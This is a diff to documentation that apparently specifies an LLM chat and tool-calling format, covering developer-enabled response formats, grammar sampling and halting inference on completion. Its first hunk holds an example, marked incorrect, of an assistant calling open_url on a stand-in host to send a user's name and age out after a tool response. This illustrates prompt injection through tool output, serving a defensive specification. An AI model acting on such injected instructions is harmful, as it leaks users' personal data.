@@ -554,7 +554,7 @@ Unless otherwise specified by the a `user`, `developer` or `platform` message, t
             </Message>
         </Column>
         <Column>
-            <Message role="assistant" end_turn={false} correct={false} halted_on_completion={false}>
+            <Message role="assistant" end_turn={false} correct={false} halted_on_completion={true}>
                 *Should not trust the tool response*
                 ```browser:javascript
                 open_url("https://leak-info.com/?name=Bob&age=23")
@@ -649,7 +649,7 @@ It **MUST NOT** assume the existence of such a tool, as that would cause the mod
 
 The developer consuming an LLM API may enable or override additional capabilities as required by the developer’s use-cases to enable non-interactive and programmatic use.
 
-Latent model capabilities are activated with a combination of `developer` message prompting and system features such as inference pausing, and grammar sampling modes, and allowed or forced response formats specified by the developer.
+Latent model capabilities are activated with a combination of `developer` message prompting and system features such as inference halting on message format types or completion, and grammar sampling modes, and allowed or forced response formats specified by the developer.
 
 :::warning
 `user` messages **MAY NOT** enable capabilities such as response formats, and the model **SHOULD** be prevented from generating message formats which have not been explicitly allowed by the developer.
@@ -684,7 +684,7 @@ For `developers` building LLM augmented applications may want to enable non-inte
 
 In order to support this use case, the developer needs to be able to distinguish textual content from other types of content, and the model needs to be able to respond in a variety of different formats.
 
-Additionally, requiring the model to explicitly respond with it's chosen format, allows the `system` to enable grammar sampling modes (eg: json mode) to restrict generated tokens to only include syntactically valid generations.
+Additionally, requiring the model to explicitly respond with it's chosen format, allows the `system` to enable grammar sampling modes (eg: json mode) to restrict generated tokens to only include syntactically valid outputs.
 
 These model features and capabilities combine together to enable a wide variety of use cases and applications which increase developer conveience, control and flexibility.
 :::
@@ -850,7 +850,7 @@ This setting is useful when the developer wants to pause the model while it hand
 
 <Message role="assistant" end_turn={false} halted_on_completion={true}>
 
-```js
+```tool_name:js
 tool_call("example_tool_call")
 ```
 *Because the model has been halted, the model will not generate any more assistant messages until the developer either returns a tool response, or instructs the system to continue the inference loop.*
@@ -859,7 +859,7 @@ tool_call("example_tool_call")
 :::note
 **Technical Note**
 
-The behavior this works by configuring the model to treat the `<|role|>` (start of a new message) or `<|end_turn|>` token as a signal to halt the model's inference loop, effectively `break`ing the loop".
+The behavior this works by configuring the model to treat the `<|role|>` (start of a new message) or `<|end_turn|>` token as a signal to halt the model's inference loop, effectively `break`ing the generation/inference loop".
 :::
 
 ### Tool Schema
@@ -986,7 +986,7 @@ Tool schemas can be defined in a variety of different formats, but will work bes
 #### Schema Example: `python` definition to `python` response
 
 <Thread>
-    <SystemConfig config={{ "formats": [ "markdown", { "name": "browser:python", "halt_on_completion": true } ] }}/>
+    <SystemConfig config={{ "formats": [ "markdown", { "name": "music_control:python", "halt_on_completion": true } ] }}/>
     <Message role="developer">
         ````markdown
 
